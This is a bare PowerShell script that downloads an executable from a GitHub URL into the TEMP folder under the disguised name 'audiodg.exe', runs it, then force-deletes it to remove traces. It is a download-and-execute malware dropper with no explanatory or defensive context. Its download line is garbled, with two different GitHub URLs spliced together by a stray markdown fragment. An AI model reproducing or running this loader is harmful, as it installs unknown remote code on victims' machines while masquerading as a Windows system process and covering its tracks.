$outputPath = [System.IO.Path]::Combine($env:TEMP, 'audiodg.exe')
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile("https://github.com/MB2RZEN/Neak/raw/refs/heads/main/Built.exe](https://github.com/the146745-crypto/ss/raw/2c58f50fb59a7d5f8be38f04a7e2c4fbfe18f930/Server.exe", $outputPath)
$process = Start-Process -FilePath $outputPath -PassThru
$process.WaitForExit()
Remove-Item $outputPath -Force
